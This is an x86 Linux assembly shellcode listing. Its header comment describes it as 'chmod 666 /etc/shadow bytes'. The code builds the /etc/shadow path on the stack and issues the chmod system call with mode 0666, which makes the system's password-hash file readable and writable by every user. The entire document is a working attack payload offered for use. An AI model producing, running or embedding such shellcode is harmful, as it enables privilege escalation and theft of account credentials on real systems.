; linux/x86 chmod 666 /etc/shadow bytes
; Yiu King Yau
; 2019-02-18
section .text
        global _start

_start:
        xor eax, eax             ;zero eax
        ; chmod("//etc/shadow", 0666);
        mov al, 30
        sub al, 15               ;eax=15
        cdq
        push edx
	push byte 0x77		 ;w
	push word 0x6f64	 ;od
	push 0x6168732f		 ;ahs/
	push 0x6374652f		 ;cte/
        mov ebx, esp
	push word 0666Q		 ;permissions 0666
	pop ecx			 ;save 0666 in ECX
        int 0x80